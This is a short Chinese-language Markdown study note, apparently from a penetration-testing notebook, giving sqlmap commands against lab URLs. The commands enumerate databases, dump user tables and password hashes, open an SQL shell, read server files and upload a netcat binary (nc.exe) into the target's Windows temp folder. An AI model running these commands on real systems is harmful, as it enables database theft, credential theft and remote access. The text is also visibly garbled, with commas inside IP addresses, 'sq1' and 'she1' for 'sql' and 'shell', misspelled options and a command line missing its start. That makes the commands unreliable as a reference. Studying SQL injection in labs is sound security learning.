---
data: 2024-06-29
关联:
  - "[[book/知识笔记/渗透/渗透流程梳理]]"
tags:
  - 外网打点
博客链接: https:/www.cnblogs.com/Ho1dF0rward/p/18284881
---
## 基础使用

~~~
sqlmap.py -u "http://192,168.1.104/sq11/Less-1/?id=1&uid=2 "
~~~

### 文本中获取请求

~~~
sqlmap.py -r desktop/1.txt
~~~

### 查询数据库与表

~~~
sqlmap.py -u http://192.168.1.104/sql1/Less-1/?id=1 --dbs
sqlmap.py -u http://192.168.1.104/sql1/Less-1/?id=1 --D --tabls//-D 不指定具体数据库
sqlmap.py-u "http://192.168.1.7/sql/union.php?id=1" --current-db //当前网站使用的数据库
~~~

### 获取字段与内容

~~~
sqlmap.py -u "http://192.168,1.7/sq1/union.php?id=1" -D dkeye -T user info --columns
sqlmap.py-u"http://192.168,1.7/sq1/union.php?id=1"-D dkeye -T user info --c password,usernaems --dump
~~~

### 查询用户与密码

~~~
sqlmap.py-u "http://192.168.1.7/sql/union.php?id=1" --passwords
sqlmap.py-u "http://192.168.1.7/sql/union.php?id=1" --users
sqlmap.py-u "http://192.168.1.7/sql/union.php?id=1" --current-user //当前网站用户
~~~

## 进阶使用
### 设置探测等级

~~~
--level 5
~~~

### 运行命令

~~~
sqlmap.py -u "http://192.168.1.7/sq1/union.php?id=1” --sq1-she1
~~~

### 读取或上传文件

~~~
http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther"  --file-read "C:/example.exe" -v1

python sqlmap.py -u "http://192.168.136.129/sq1map/mysq1/get int.aspx?id-1"
--file-write "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
//1. `-v 1`: 这个参数设置 sqlmap 的详细级别为 1,即显示基本信息。
~~~